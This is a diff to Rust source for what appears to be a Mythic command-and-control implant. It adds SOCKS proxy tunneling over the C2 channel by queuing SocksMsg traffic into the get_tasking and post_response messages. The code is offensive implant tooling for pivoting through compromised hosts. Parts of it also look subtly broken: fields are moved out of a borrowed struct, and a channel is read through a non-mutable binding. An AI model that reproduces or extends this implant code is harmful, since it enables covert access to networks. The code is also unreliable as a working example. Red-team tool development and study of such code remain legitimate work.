@@ -6,6 +6,10 @@ use rand::Rng;
 use serde::{Deserialize, Serialize};
 use serde_json::json;
 use std::error::Error;
+#[cfg(feature = "socks")]
+use crate::socks::SocksMsg;
+#[cfg(feature = "socks")]
+use tokio::sync::mpsc::{Receiver, Sender};
 
 use crate::profiles::Profile;
 
@@ -36,6 +40,8 @@ pub struct AgentTask {
 pub struct GetTaskingResponse {
     /// List of pending tasks
     pub tasks: Vec<AgentTask>,
+    #[cfg(feature = "socks")]
+    pub socks: Vec<SocksMsg>,
 }
 
 /// Struct used for sending the completed task information
@@ -46,6 +52,9 @@ pub struct PostTaskingResponse {
 
     /// List of completed tasking
     pub responses: Vec<serde_json::Value>,
+
+    #[cfg(feature = "socks")]
+    pub socks: Vec<SocksMsg>,
 }
 
 /// Used for holding any data which has to be passed along to a background task
@@ -89,6 +98,11 @@ pub struct SharedData {
 
     /// End time of the configured working hours
     pub working_end: NaiveTime,
+
+    #[cfg(feature = "socks")]
+    pub socks_from_backend: Option<Sender<SocksMsg>>,
+    #[cfg(feature = "socks")]
+    pub socks_to_backend: Option<Receiver<SocksMsg>>,
 }
 
 /// Main agent struct containing information with regards to C2 communication
@@ -119,6 +133,10 @@ impl Agent {
                 exit_agent: false,
                 working_start: payloadvars::working_start(),
                 working_end: payloadvars::working_end(),
+                #[cfg(feature = "socks")]
+                socks_from_backend: None,
+                #[cfg(feature = "socks")]
+                socks_to_backend: None,
             },
             c2profile,
             tasking: Tasker::new(),
@@ -140,17 +158,43 @@ impl Agent {
     /// Gets new tasking from Mythic
     pub fn get_tasking(&mut self) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
         // Create the body for receiving new tasking
+        #[cfg(not(feature = "socks"))]
         let json_body = json!({
             "action": "get_tasking",
             "tasking_size": -1,
         })
         .to_string();
 
+        #[cfg(feature = "socks")]
+        let json_body = if let Some(rx) = self.shared.socks_to_backend {
+            let mut v = Vec::new();
+            while let Ok(msg) = rx.try_recv() {
+                v.push(msg);
+            }
+            json!({
+                "action": "get_tasking",
+                "tasking_size": -1i32,
+                "socks": v,
+            })
+        }else{
+            json!({
+                "action": "get_tasking",
+                "tasking_size": -1i32,
+            })
+        }.to_string();
+
         // Send the data through the C2 profile to Mythic
         let body = self.c2profile.send_data(&json_body)?;
 
         // Deserialize the response into a struct
         let response: GetTaskingResponse = serde_json::from_str(&body)?;
+
+        #[cfg(feature = "socks")]
+        if let Some(tx) = self.shared.socks_from_backend {
+            for msg in response.socks {
+                tx.blocking_send(msg).unwrap();
+            }
+        }
 
         // Return a success and any tasking
         if !response.tasks.is_empty() {
@@ -167,9 +211,20 @@ impl Agent {
         completed: &[serde_json::Value],
     ) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
         // Create the request body with the completed tasking information
+        #[cfg(feature = "socks")]
+        let mut socks = Vec::new();
+        #[cfg(feature = "socks")]
+        if let Some(rx) = self.shared.socks_to_backend {
+            while let Ok(msg) = rx.try_recv() {
+                socks.push(msg);
+            }
+        }
+
         let body = PostTaskingResponse {
             action: "post_response".to_string(),
             responses: completed.to_owned(),
+            #[cfg(feature = "socks")]
+            socks
         };
 
         let req_payload = serde_json::to_string(&body)?;
